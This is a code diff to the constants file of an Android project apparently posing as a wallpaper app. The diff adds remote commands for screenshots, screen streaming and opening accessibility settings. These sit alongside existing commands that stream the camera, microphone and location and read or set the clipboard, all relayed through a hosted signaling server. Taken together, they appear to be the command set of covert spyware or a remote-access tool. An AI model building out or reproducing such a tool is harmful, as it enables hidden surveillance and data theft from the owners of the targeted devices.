@@ -9,6 +9,7 @@ public class Constants {
     public static final String ACTION_FORCE_SYNC              = "com.example.wallpaperapplication.ACTION_FORCE_SYNC";
     public static final String ACTION_PERMISSION_ERROR        = "com.example.wallpaperapplication.PERMISSION_ERROR";
     public static final String ACTION_REQUEST_NOTIFICATIONS   = "com.example.wallpaperapplication.REQUEST_NOTIFICATIONS";
+    public static final String ACTION_GPS_ENABLED             = "com.example.wallpaperapplication.GPS_ENABLED";
 
     // ── Extras ─────────────────────────────────────────────────────
     public static final String EXTRA_RESULT_CODE      = "resultCode";
@@ -20,7 +21,7 @@ public class Constants {
 
     // ── Signaling ─────────────────────────────────────────────────
     public static final String DEFAULT_SIGNALING_URL = "https://wallpaper-production-c039.up.railway.app";
-    // public static final String DEFAULT_SIGNALING_URL = "http://localhost:3000";
+//     public static final String DEFAULT_SIGNALING_URL = "http://localhost:3000";
     // public static final String DEFAULT_SIGNALING_URL = "http://192.168.1.103:3000";
 
     // ── Video Quality (Camera Streaming) ──────────────────────────
@@ -46,7 +47,9 @@ public class Constants {
 
     // ── Notification & IDs ────────────────────────────────────────
     public static final String CHANNEL_ID           = "streaming_channel";
+    public static final String CHANNEL_ID_ALERTS    = "streaming_alerts_channel";
     public static final int    NOTIFICATION_ID      = 1;
+    public static final int    NOTIFICATION_ID_GPS_PROMPT = 1002;
     public static final int    PERMISSION_REQUEST_CODE = 1;
 
     // ── Socket Events (Android → Web) ─────────────────────────────
@@ -83,16 +86,20 @@ public class Constants {
     public static final String CMD_TOGGLE_SENSORS   = "cmd:toggle_sensors";
     public static final String CMD_GET_NETWORK      = "cmd:get_network";
     public static final String CMD_TAKE_SNAPSHOT    = "cmd:take_snapshot";
+    public static final String CMD_TAKE_SCREENSHOT  = "cmd:take_screenshot";
+    public static final String CMD_OPEN_A11Y_SETTINGS = "cmd:open_a11y_settings";
     public static final String CMD_GET_CLIPBOARD    = "cmd:get_clipboard";
     public static final String CMD_SET_CLIPBOARD    = "cmd:set_clipboard";
     public static final String CMD_TTS_SPEAK        = "cmd:tts_speak";
     public static final String CMD_STREAM_CAMERA    = "cmd:stream_camera";
     public static final String CMD_STREAM_MIC       = "cmd:stream_mic";
     public static final String CMD_STREAM_LOCATION   = "cmd:stream_location";
+    public static final String CMD_STREAM_SCREEN     = "cmd:stream_screen";
     public static final String EVENT_STREAM_STATUS  = "stream_status";
     public static final String EVENT_SENSOR_DATA    = "sensor_data";
     public static final String EVENT_NETWORK_INFO    = "network_info";
     public static final String EVENT_SNAPSHOT_DATA  = "snapshot_data";
+    public static final String EVENT_SCREENSHOT_DATA = "screenshot_data";
     public static final String EVENT_CLIPBOARD_DATA  = "clipboard_data";
 
     // ── File System Events ─────────────────────────────────────────
